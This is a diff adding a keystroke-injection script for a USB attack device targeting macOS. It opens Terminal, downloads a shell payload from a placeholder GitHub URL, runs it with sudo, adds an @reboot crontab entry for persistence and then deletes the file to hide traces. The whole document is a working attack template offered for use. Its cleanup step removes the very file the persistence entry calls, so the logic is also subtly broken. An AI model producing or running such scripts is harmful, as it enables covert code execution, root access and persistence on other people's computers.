@@ -1,0 +1,40 @@
+DELAY 1000
+REM Open Terminal
+GUI SPACE
+DELAY 500
+TYPE "Terminal"
+ENTER
+DELAY 1000
+
+REM Download the payload from GitHub (Replace the URL with your GitHub URL)
+DELAY 500
+TYPE "curl -L https://raw.githubusercontent.com/yourteam/yourrepo/main/payload.sh -o ~/Downloads/payload.sh"
+ENTER
+DELAY 1500
+
+REM Set execution permissions
+DELAY 500
+TYPE "chmod +x ~/Downloads/payload.sh"
+ENTER
+DELAY 1000
+
+REM Execute the payload
+DELAY 500
+TYPE "sudo ~/Downloads/payload.sh"
+ENTER
+DELAY 2000
+
+REM Optionally, set persistence (add to cron or launchd, depending on preference)
+DELAY 500
+TYPE "echo '@reboot sudo ~/Downloads/payload.sh' | crontab -"
+ENTER
+
+REM Clean up the Ducky trace
+DELAY 500
+TYPE "rm ~/Downloads/payload.sh"
+ENTER
+
+REM Close Terminal
+DELAY 500
+TYPE "exit"
+ENTER
